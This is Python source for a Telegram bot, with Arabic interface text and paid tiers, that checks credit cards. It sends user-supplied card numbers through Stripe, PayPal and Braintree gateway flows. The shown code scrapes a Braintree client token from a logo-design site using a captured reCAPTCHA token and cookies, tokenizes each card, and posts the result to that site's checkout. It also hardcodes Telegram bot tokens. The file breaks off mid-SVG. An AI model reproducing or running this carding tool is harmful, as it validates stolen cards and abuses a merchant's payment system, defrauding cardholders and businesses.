from pytz import timezone
from apscheduler.schedulers.background import BackgroundScheduler
from datetime import datetime, timedelta
import telebot
import requests
from telebot import types
from bs4 import BeautifulSoup
import pycountry
import uuid
import time
from faker import Faker
import random
import os
import string
import re
import base64
import json
from user_agent import generate_user_agent
import urllib.request
faker = Faker()
fake = Faker()
token = '7240566827:AAF2QwtjRVK8Z0Dyb8vHMtlbAHsTnWLEE2k'
bot = telebot.TeleBot(token, parse_mode="HTML")
admin = ['5775063874', '6298260313', ''] #ادمنز
users = {}
vip_keys = {}
vip_users = {}
vip_expirations = {}
ban_list = set()
channel_id = "@aikmaiaija"

@bot.message_handler(commands=["start"])
def start(message):
    user_id = str(message.from_user.id)
    try:
        nm = message.from_user.first_name or ""
    except:
        nm = ""   
    if user_id in admin:
        req = requests.get(f'https://api.telegram.org/bot6720340096:AAGrFG_vEqG-s-iyIn_qIMmK-6y18AebuQ8/getChatMember?chat_id={channel_id}&user_id={user_id}').json()
        
        if req['ok'] and req['result']['status'] in ['member', 'administrator', 'creator']:
            if user_id not in users:
                users[user_id] = {"attempts": 50, "last_attempt": datetime.now().date()}
                
            ttgg = """
مرحبا أيها الأدمن
دعني أريك ما يمكنك فعله
(لاضافه عضو الى VIP )
/generate_vip - عدد الايام - اليوزر

/ban - لحظر عضو
/unban - لإلغاء حظر عضو
/all - لإرسال رسالة لجميع المستخدمين
/cmds - لعرض الخيارات
/info - لعرض المعلومات
            """
            bot.reply_to(message, f"<strong>{ttgg}</strong>")
        else:
            ch = channel_id.split('@')[1]
            tlg = f"""
🚸| عذرا عزيزي
🔰| عليك الاشتراك بقناة البوت لتتمكن من استخدامه

- https://t.me/{ch}

‼️| اشترك ثم قم بالدخول إلى البوت
            """
            bot.send_message(message.chat.id, f"<strong>{tlg}</strong>", parse_mode="html", reply_markup=types.InlineKeyboardMarkup())
    else:
        
        req = requests.get(f'https://api.telegram.org/bot6720340096:AAGrFG_vEqG-s-iyIn_qIMmK-6y18AebuQ8/getChatMember?chat_id={channel_id}&user_id={user_id}').json()
        if req['ok'] and req['result']['status'] in ['member', 'administrator', 'creator']:
            if user_id not in users:
                users[user_id] = {"attempts": 50, "last_attempt": datetime.now().date()}
            but2 = types.InlineKeyboardButton(text='- ⚜️𝐀𝐛𝐨𝐮𝐭 ', callback_data='abo')
            A = types.InlineKeyboardButton(text="𝐏𝐥𝐚𝐧 𝐕𝐈𝐏💱 ", callback_data='Dev')
            ttgg = f"""
مرحبا بك عزيزي {nm} 🔮
أنا بوت أقوم بفحص البطاقات الائتمانية. من فضلك دعني أساعدك.
قم بإرسال الأمر التالي لعرض الخدمات:
/cmds
لعرض معلوماتك 
/info
            """
            maac = types.InlineKeyboardMarkup()
            maac.row_width = 2
            maac.add(A, but2)            
            bot.reply_to(message, f"<strong>{ttgg}</strong>", parse_mode="html", reply_markup=maac)
        else:
            ch = channel_id.split('@')[1]
            tlg = f"""
🚸| عذرا عزيزي
🔰| عليك الاشتراك بقناة البوت لتتمكن من استخدامه

- https://t.me/{ch}

‼️| اشترك ثم قم بالدخول إلى البوت
            """
            bot.send_message(message.chat.id, f"<strong>{tlg}</strong>", parse_mode="html", reply_markup=types.InlineKeyboardMarkup())


@bot.callback_query_handler(func=lambda call: True)
def st(call):
    if call.data == "abo":
        mh = """
مميزات ال Free:
يستخدم جميع البوبات لكن 50 محاوله في اليوم
مميزات ال VIP يستخدم جميع البوابات بدون حدود.!
        """
        bot.send_message(call.message.chat.id, f"<strong>{mh}</strong>", parse_mode="html", reply_markup=types.InlineKeyboardMarkup())
    elif call.data == "Dev":
        kii = """
مرحبا بك عزيزي:
اذا كنت تود الاشتراك بالبوت واستخدام جميع المميزات دون توقف
ما عليك سوا قراءه الاسعار:
If You Want To Become VIP And Use All Tools WithOut Stoped:
DAY : 2.5$ USDT
2 DAY : 4 $ USDT
WEEKE : 10$ USDT
MOUTH : 30$ USDT
ALL THE SOURCE PRICE : 500$ USDT OPEN SOURCE
OWNER : @PP9PPP9
Admins : @KA_N1 OR @P_S_45
        """
        bot.send_message(call.message.chat.id, f"<strong>{kii}</strong>", parse_mode="html", reply_markup=types.InlineKeyboardMarkup())
        
        
        

@bot.message_handler(commands=["generate_vip"])
def generate_vip_key(message):
    user_id = str(message.from_user.id)
    if user_id in admin:
        args = message.text.split()
        if len(args) != 3:
            bot.reply_to(message, "استخدام: /generate_vip <user_id> <عدد الأيام>")
            return
        try:
            target_user_id = str(args[1])
            duration_days = int(args[2])
        except:
            bot.reply_to(message, "تأكد من أن معرف المستخدم وعدد الأيام أرقام صحيحة.")
            return
        
        if target_user_id in users:
            vip_key = "mahos-" + uuid.uuid4().hex.upper()
            vip_keys[vip_key] = target_user_id
            expiration_date = datetime.now() + timedelta(days=duration_days)
            vip_expirations[target_user_id] = expiration_date

            bot.reply_to(message, f"مفتاح VIP للمستخدم {target_user_id}:\n\n/use_vip {vip_key}\n\nالصلاحية تنتهي في {expiration_date}")
            bot.send_message(target_user_id, f"تم منحك مفتاح VIP لمدة {duration_days} أيام. الصلاحية تنتهي في {expiration_date}.")
        else:
            bot.reply_to(message, "المستخدم غير موجود.")
    else:
        bot.reply_to(message, "أنت لست مديراً.")

def check_expirations():
    now = datetime.now()
    expired_users = [user_id for user_id, exp_date in vip_expirations.items() if exp_date < now]
    for user_id in expired_users:
        del vip_expirations[user_id]
        if user_id in vip_users:
            del vip_users[user_id]
        users[user_id]["attempts"] = 50
        users[user_id]["last_attempt"] = datetime.now().date()

scheduler = BackgroundScheduler(timezone=timezone('Asia/Aden'))
scheduler.add_job(check_expirations, 'interval', minutes=1)
scheduler.start()

@bot.message_handler(commands=["use_vip"])
def use_vip(message):
    user_id = str(message.from_user.id)
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "استخدام: /use_vip <vip_key>")
        return
    vip_key = args[1]
    if vip_key in vip_keys and vip_keys[vip_key] == user_id:
        vip_users[user_id] = datetime.now() + timedelta(days=1)
        del vip_keys[vip_key]
        bot.reply_to(message, "تم تفعيل VIP بنجاح.")
        bot.send_message(user_id, f"تم تفعيل البوت بنجاح. الوقت: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    else:
        bot.reply_to(message, "مفتاح VIP غير صالح أو مستخدم.")

@bot.message_handler(commands=["unsubscribe"])
def unsubscribe(message):
    user_id = str(message.from_user.id)
    if user_id in vip_users:
        del vip_users[user_id]
        if user_id in vip_expirations:
            del vip_expirations[user_id]
        users[user_id]["attempts"] = 50
        users[user_id]["last_attempt"] = datetime.now().date()
        bot.reply_to(message, "تم إلغاء اشتراك VIP الخاص بك.")
    else:
        bot.reply_to(message, "أنت لست مشتركاً في VIP.")

@bot.message_handler(commands=["all"])
def broadcast(message):
    user_id = str(message.from_user.id)
    if user_id in admin:
        args = message.text.split(maxsplit=1)
        if len(args) != 2:
            bot.reply_to(message, "استخدام: /all <message>")
            return
        msg = args[1]
        for user in users:
            bot.send_message(user, msg)
    else:
        bot.reply_to(message, "أنت لست مديراً.")

@bot.message_handler(commands=["ban"])
def ban_user(message):
    user_id = str(message.from_user.id)
    if user_id in admin:
        args = message.text.split()
        if len(args) != 2:
            bot.reply_to(message, "استخدام: /ban <user_id>")
            return
        banned_user_id = str(args[1])
        ban_list.add(banned_user_id)
        bot.reply_to(message, f"تم حظر المستخدم {banned_user_id}.")
    else:
        bot.reply_to(message, "أنت لست مديراً.")

@bot.message_handler(commands=["unban"])
def unban_user(message):
    user_id = str(message.from_user.id)
    if user_id in admin:
        args = message.text.split()
        if len(args) != 2:
            bot.reply_to(message, "استخدام: /unban <user_id>")
            return
        unbanned_user_id = str(args[1])
        if unbanned_user_id in ban_list:
            ban_list.remove(unbanned_user_id)
            bot.reply_to(message, f"تم رفع الحظر عن المستخدم {unbanned_user_id}.")
        else:
            bot.reply_to(message, "المستخدم غير محظور.")
    else:
        bot.reply_to(message, "أنت لست مديراً.")

@bot.message_handler(commands=['cmds'])
def cmds(message):
    ttgg = """
الأوامر المتاحة:

لفحص بطاقات سترايب AUTH
.st البطاقه or /st البطاقه
---------------------------------
.لفحص بطاقات بايبال تشارج
.pay البطاقه or /pay البطاقه
---------------------------------
لفحص بطاقات سترايب تشارج
.sr البطاقه or /sr البطاقه
---------------------------------
لفحص بطاقات سترايب دونيت
.sq البطاقه or /sq البطاقه
---------------------------------
لفحص بطاقات ربط جوجل بلاي
.go البطاقه or /go البطاقه
---------------------------------
لفحص بطاقات LookUP BR 3DS
.vbv البطاقه or /vbv البطاقه
---------------------------------
لفحص بطاقات برانتري تشارج 
.chk البطاقه or /chk البطاقه
---------------------------------
لفحص BIN
.bin البطاقه or /bin البطاقه
---------------------------------
    """
    bot.reply_to(message, f"<strong>{ttgg}</strong>")

@bot.message_handler(commands=['info'])
def inf(message):
    try:
        nm = message.from_user.first_name or "غير معروف"
    except:
        nm = "غير معروف"

    try:
        user_id = message.from_user.id
    except:
        user_id = ""

    try:
        username = message.from_user.username or "غير متوفر"
    except:
        username = "PP9PPP9"

    try:
        bio = bot.get_chat(user_id).bio or ""
    except:
        bio = ""

    user_type = "VIP" if str(user_id) in vip_users else "Free"

    try:
        if '@' in username:
            username = username.split('@')[1]
        api_tele = requests.get(f'https://t.me/{username}')
        soup = BeautifulSoup(api_tele.content, 'html.parser')
        profile_pic_url = soup.find('meta', property='og:image')['content']
        profile_pic_path = f"{username}.jpg"
        urllib.request.urlretrieve(profile_pic_url, profile_pic_path)

        msg = f"""
═══════𝚃𝚎𝚕𝚎𝚐𝚛𝚊𝚖═════════
- 𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞 ⇾ @{username}
- 𝐍𝐚𝐦𝐞 ⇾ {nm}
- 𝐁𝐢𝐨 ⇾ {bio}
- 𝐂𝐮𝐬𝐭𝐨𝐦𝐞𝐫: {user_type}
══════𝚃𝚎𝚕𝚎𝚐𝚛𝚊𝚖═════════
        """

        with open(profile_pic_path, 'rb') as photo:
            bot.send_photo(message.chat.id, photo, caption=msg, parse_mode='html')
        os.remove(profile_pic_path)
    except Exception as e:
        bot.reply_to(message, f"<strong>{msg}</strong>")



@bot.message_handler(func=lambda message: True)
def handle_message(message):
    user_id = message.from_user.id
    if user_id in ban_list:
        bot.reply_to(message, "أنت محظور.")
        return

    user_type = "VIP" if user_id in vip_users else "Free"
    current_date = datetime.now().date()

    if user_id not in users:
        users[user_id] = {"attempts": 50, "last_attempt": current_date}

    if user_type == "Free":
        if users[user_id]["last_attempt"] != current_date:
            users[user_id]["attempts"] = 50
            users[user_id]["last_attempt"] = current_date

        if users[user_id]["attempts"] <= 0:
            bot.reply_to(message, "لقد استنفدت جميع محاولاتك اليومية. حاول مرة أخرى غدًا.")
            return
        users[user_id]["attempts"] -= 1

    if '.bin' in message.text:
        process_bin(message, user_type)
    elif '/bin' in message.text:
        process_bin(message, user_type)
    elif '/st' in message.text:
        process_cc_strip1(message, user_type)
    elif '.st' in message.text:
        process_cc_strip1(message, user_type)
    elif '/pay' in message.text:
        Paypal(message, user_type)
    elif '.pay' in message.text:
        Paypal(message, user_type)
    elif '/sr' in message.text:
        StripCharge(message, user_type)
    elif '.sr' in message.text:
        StripCharge(message, user_type)
    elif '/sq' in message.text:
        check_card(message, user_type)
    elif '.sq' in message.text:
        check_card(message, user_type)
    elif '/vbv' in message.text:
        check_VPV(message, user_type)
    elif '.vbv' in message.text:
        check_VPV(message, user_type)
    elif '/chk' in message.text:
        check_CBR(message, user_type)
    elif '.chk' in message.text:
        check_CBR(message, user_type)
    else:
        bot.reply_to(message, "الأمر غير صالح.")




def Chek_BrCok():
    
    url = "https://app.brandmark.io/v3/client_token.php"
 
    payload = json.dumps({
  "recaptcha_token": "03AFcWeA6n58VGSEerzHi3GwLmLK4MaYMldsSQ2GQiaRKU7zv_D7XGAHiN7Squb5J58Gc-yuSWIT0c541V5dJ8fNatAIa71hvp6V1HPZz4aQWRrl65fhFtqAfzfSotD_fm5L3lqCGixuxt5-alPIkKXBTOK2seaAOkx9JCcFc1-xssFCL5iPCJdzQ-42bsN2o72EHe-RvXDgdcdFDsiijlGrSv6CjPtTM16I2A-j08A9YpyZl-fUxLwid3daFRym1vrn4Qrx_PIcehJg0M8QdVB0tNz0-rdkkUHXEIowl4eyL8jv4U0VGg8QEJKOVmrkAft-mmAdzaJGzpFI4dFL27zGjk4AJ9tbgqj0-S65B_WX5dqrlSP5D_O0BpDuYc3JPje-9uYjtpas4UEyxokVOA2amNwpQcT6onIfsmzWDfZblGJutXISEQk_UR33Xn9DCl93x2vhG-BTM4PZ-6CzkZTjns-gA_vFPH3BP-JihtKBeZBIysvthwM1vJLC9Mk81hQDzypOTpbaN8wfPpEBl7PYYiyWRx-xWLNzagrvrU7Gzphw98tE3X7M1tBD8HbjMw0o4EuOsy770hGhP5YczyC8oVbzAAHQ0yeg1FRXeQTkkMQi6N6gvpombmqPHqtjKZPK5FthLC42yINaFxtejWOXxfgTczui3qmD2tLrz3cuY7GAMIwq7Nkw8iYOSPMgGUo9yrmNTZA0R0Rr5a1Tn5kuBDqviWDW72oOGt4auMJhmDsnI3B-_xgmKNrx94G0pGwYKBrJMkWBfr8ldnVbbWncYKugv6MKTO0Zof-xIor7qwKSfbqBwPgVxSKNAmY6MUEVpG0xmuBdRpMhXnQfvwcdWS6q06BSSSa-yE5qLUZDeWPzRmRkt8G27Al_fvuv96YtjCRSVFbKhW2BQAACG_CLdhFV08BBlzHeUXpPO79QKB1mMfU9iPg6nYqOyaO_Wyx6LqJ2RPsVN7aT5cwkVyOI4LlIPxclOFr2uXjG483dd6F8hT_6xi_wHUBP2pW4Ghyskv5Th2TuyTAqkTw1SPcwvpode9KUnoP9Agbok0eiW0o5WGuRGxRE8ZabBalzZpscVXkHPyIGoYb8WFQB_pKWyUb1wu77ZGuZbbqiFX8xnEnzQoPA6ytw86M4BglGvpt5IMGxfLx_hHF8IqZC-Fn48qtCA0RZpnISPqaIOIHXn3oJlJYVjPMyqGUA3xbAKSAAg5SSJ_symSm3bPBDLzKeRXkcwjSF98_FQPTH2HuSPp4hgae_pcgqFMG-tlRe29ksUfroGR2jP3F5DugY_cN7WtSm52Fu_O6m_ekJ7IUEx8hribxL4qto6LyGSvNxjlE5KkYbtgQJ8orDyinKDoV13KDmH72ji17d5MhwQycNHeHLKyF73k52LwWOTtQ6CkqtBnZ1yLxQs2Si8jtRdwk00sFUUL4FO2qgy2zPhnwmksJoRH61lzpCrICbz4s3N9gc3nUT8W28BkRlvUrAWIDIQ6R6_-b_NOgkPsVa2oj862bx6bM4iwjcfAKqqBzXwczTvf8hK_fGMRIIPJIcz-WJ6kVbR1hDGZRgiPVkDeVgrrp8PNgkZjezvRe9ehz2t-5hmvgYs_sJ5zH07NAtIuaXvro-ibm5QWTuc-pjHlDZzGP3C3av_7QSiMYZa_pI6uLoQkzBdXOG9yrTlGkxL3GlCfNQzedyv1NmuC9y4yVWMm1BcrEVzuqD8",
  "token": "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"
})

    headers = {
  'User-Agent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
  'Accept': "application/json, text/plain, */*",
  'Content-Type': "application/json",
  'sec-ch-ua': "\"Not)A;Brand\";v=\"24\", \"Chromium\";v=\"116\"",
  'sec-ch-ua-mobile': "?0",
  'sec-ch-ua-platform': "\"Linux\"",
  'origin': "https://app.brandmark.io",
  'sec-fetch-site': "same-origin",
  'sec-fetch-mode': "cors",
  'sec-fetch-dest': "empty",
  'referer': "https://app.brandmark.io/v3/",
  'accept-language': "ar-YE,ar;q=0.9,en-YE;q=0.8,en-US;q=0.7,en;q=0.6",
  'Cookie': "_ga=GA1.2.222650613.1716437608; _gid=GA1.2.466857031.1716437608; _gat=1; _ga_93VBC82KGM=GS1.2.1716437609.1.1.1716437772.0.0.0"
}

    res = requests.post(url, data=payload, headers=headers)
    key=res.json()["client_token"]
    dec = base64.b64decode(key)
    clint = dec.decode('utf-8')
    Auth = json.loads(clint)
    fixed = Auth['authorizationFingerprint']
    try:
        os.remove('CHK.txt')
    except:
        pass
    with open('CHK.txt', 'a') as t:
        t.write(f"{fixed}\n")
        
        


def check_CBR(message, user_type):
    kg = bot.reply_to(message, '<strong>[~] Processing Your request 10 Second Please... </strong>', parse_mode="HTML")
    time.sleep(10)
    if '.chk' in message.text:
        P = message.text.split('.chk')[1].strip()
    elif '/chk' in message.text:
        P = message.text.split('/chk')[1].strip()

    n, mm, yy, cvc = map(str.strip, P.split("|"))
    if not yy.startswith('20'):
        yy = '20' + yy

    try:
        start_time = time.time()

        try:
            with open("CHK.txt", "r") as f:
                Auth = f.read().strip()
        except:
            Chek_BrCok()
            with open("CHK.txt", "r") as f:
                Auth = f.read().strip()

        url = "https://payments.braintree-api.com/graphql"

        payload = {
            "clientSdkMetadata": {
                "source": "client",
                "integration": "dropin2",
                "sessionId": "d685835c-2dc2-4eb4-a23d-c03609c75624"
            },
            "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }",
            "variables": {
                "input": {
                    "creditCard": {
                        "number": n,
                        "expirationMonth": mm,
                        "expirationYear": yy,
                        "cvv": cvc,
                    },
                    "options": {
                        "validate": False
                    }
                }
            },
            "operationName": "TokenizeCreditCard"
        }

        headers = {
            'User-Agent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
            'Content-Type': "application/json",
            'sec-ch-ua': "\"Not)A;Brand\";v=\"24\", \"Chromium\";v=\"116\"",
            'sec-ch-ua-mobile': "?0",
            'authorization': f"Bearer {Auth}",
            'braintree-version': "2018-05-10",
            'sec-ch-ua-platform': "\"Linux\"",
            'origin': "https://assets.braintreegateway.com",
            'sec-fetch-site': "cross-site",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'referer': "https://assets.braintreegateway.com/",
            'accept-language': "ar-YE,ar;q=0.9,en-YE;q=0.8,en-US;q=0.7,en;q=0.6"
        }

        response = requests.post(url, data=json.dumps(payload), headers=headers)
        data = response.json()
        if 'data' in data:
            tokenize_credit_card = data['data'].get('tokenizeCreditCard', {})
            token = tokenize_credit_card.get('token', None)
            credit_card = tokenize_credit_card.get('creditCard', {})
            
            bin_number = credit_card.get('bin', None)
            brand_code = credit_card.get('brandCode', None)
            last4 = credit_card.get('last4', None)
            expiration_month = credit_card.get('expirationMonth', None)
            expiration_year = credit_card.get('expirationYear', None)
            bin_data = credit_card.get('binData', {})
            
            prepaid = bin_data.get('prepaid', None)
            healthcare = bin_data.get('healthcare', None)
            debit = bin_data.get('debit', None)
            durbin_regulated = bin_data.get('durbinRegulated', None)
            commercial = bin_data.get('commercial', None)
            payroll = bin_data.get('payroll', None)
            issuing_bank = bin_data.get('issuingBank', None)
            country_of_issuance = bin_data.get('countryOfIssuance', None)
            product_id = bin_data.get('productId', None)
            last2 = last4[-2:] if last4 else None
                    
        else:
            print("المفتاح 'data' غير موجود في الاستجابة.")

    except ValueError as e:
        print(f"فشل في تحليل JSON: {e}")
        
    cookies = {
        '_ga': 'GA1.2.222650613.1716437608',
        '_gid': 'GA1.2.466857031.1716437608',
        '_ga_93VBC82KGM': 'GS1.2.1716437609.1.1.1716438544.0.0.0',
    }

    headers = {
        'authority': 'app.brandmark.io',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'ar-YE,ar;q=0.9,en-YE;q=0.8,en-US;q=0.7,en;q=0.6',
        'content-type': 'application/json;charset=UTF-8',
        'origin': 'https://app.brandmark.io',
        'referer': 'https://app.brandmark.io/v3/',
        'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
    }

    json_data = {
    'tier': 'basic',
    'email': 'esszz12345678@gmail.com',
    'payload': {
        'nonce': token,
        'details': {
            'expirationMonth': expiration_month,
            'expirationYear': expiration_year,
            'bin': n[:-6],
            'cardType': brand_code,
            'lastFour': last4,
            'lastTwo': last2,
        },
        'type': 'CreditCard',
        'description': 'ending in 39',
        'deviceData': '{"device_session_id":"685ca693e6577a3ca189451757340a37","fraud_merchant_id":null,"correlation_id":"f4a1f38a5bc981d4a11a09ddc1c3b4df"}',
        'binData': {
            'prepaid': 'No',
            'healthcare': 'No',
            'debit': 'Yes',
            'durbinRegulated': 'No',
            'commercial': 'Unknown',
            'payroll': 'No',
            'issuingBank': 'DOHA BANK Q.S.C',
            'countryOfIssuance': 'QAT',
            'productId': 'MDS',
        },
    },
    'discount': False,
    'referral': None,
    'params': {
        'id': 'logo-8434f65d-aafe-4d26-a816-9dd874bee66f',
        'layout': 1,
        'title': 'Ahjaja',
        'titleFamily': 'Brandmark Script 4',
        'titleVariant': 'regular',
        'titleColor': [
            {
                'hex': '#f8056b',
                'location': 0,
            },
            {
                'hex': '#d2ddf7',
                'location': 1,
            },
        ],
        'titleScale': 1.67,
        'titleLetterSpace': 0,
        'titleLineSpace': 1.1,
        'titleBoldness': 0,
        'titleX': 0,
        'titleY': 0,
        'titleAlign': 'left',
        'slogan': '',
        'sloganFamily': 'Lora',
        'sloganVariant': 'italic',
        'sloganColor': [
            {
                'hex': '#f8056b',
            },
        ],
        'sloganScale': 1.67,
        'sloganLetterSpace': 1,
        'sloganLineSpace': 1.1,
        'sloganBoldness': 0,
        'sloganAlign': 'left',
        'sloganX': 0,
        'sloganY': 0,
        'icon': {
            'type': 'noun',
            'id': 240570,
            'preview': 'https://app.brandmark.io/nounpreview/240570.png',
        },
        'showIcon': True,
        'iconScale': 1,
        'iconColor': [
            {
                'hex': '#f8056b',
            },
        ],
        'iconContainer': None,
        'showIconContainer': False,
        'iconContainerScale': 1,
        'iconContainerColor': [
            {
                'hex': '#8693fb',
            },
        ],
        'iconSpace': 1,
        'iconX': 0,
        'iconY': 0,
        'nthChar': 0,
        'container': None,
        'showContainer': False,
        'containerScale': 1,
        'containerColor': [
            {
                'hex': '#8693fb',
            },
        ],
        'containerX': 0,
        'containerY': 0,
        'backgroundColor': [
            {
                'hex': '#616ffd',
            },
        ],
        'palette': [
            '#616ffd',
            '#f8056b',
            '#eb4d99',
            '#de95c8',
            '#d2ddf7',
        ],
        'keywords': [
            'Hhhhh',
        ],
    },
    'svg': '<!--?xml version="1.0" encoding="UTF-8" standalone="no"?-->\n<svg xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:cc="http://creativecommons.org/ns#" xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#" xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" id="svg631542" viewBox="0 0 1024 768" height="768px" width="1024px" version="1.1">\n  <metadata id="metadata631548">\n    <rdf:rdf>\n      <cc:work rdf:about="">\n        <dc:format>image/svg+xml</dc:format>\n        <dc:type rdf:resource="http://purl.org/dc/dcmitype/StillImage"></dc:type>\n      </cc:work>\n    </rdf:rdf>\n  </metadata>\n  <defs id="defs631546"></defs>\n  <linearGradient spreadMethod="pad" y2="30%" x2="-10%" y1="120%" x1="30%" id="3d_gradient2-logo-8434f65d-aafe-4d26-a816-9dd874bee66f">\n    <stop id="stop631523" stop-opacity="1" stop-color="#ffffff" offset="0%"></stop>\n    <stop id="stop631525" stop-opacity="1" stop-color="#000000" offset="100%"></stop>\n  </linearGradient>\n  <linearGradient gradientTransform="rotate(-30)" spreadMethod="pad" y2="30%" x2="-10%" y1="120%" x1="30%" id="3d_gradient3-logo-8434f65d-aafe-4d26-a816-9dd874bee66f">\n    <stop id="stop631528" stop-opacity="1" stop-color="#ffffff" offset="0%"></stop>\n    <stop id="stop631530" stop-opacity="1" stop-color="#cccccc" offset="50%"></stop>\n    <stop id="stop631532" stop-opacity="1" stop-color="#000000" offset="100%"></stop>\n  </linearGradient>\n  <g id="logo-group">\n    <image xlink:href="" id="container" x="272" y="144" width="480" height="480" transform="translate(0 0)" style="display: none;"></image>\n    <g id="logo-center" transform="translate(58.092724265000015 0)">\n      <image xlink:href="" 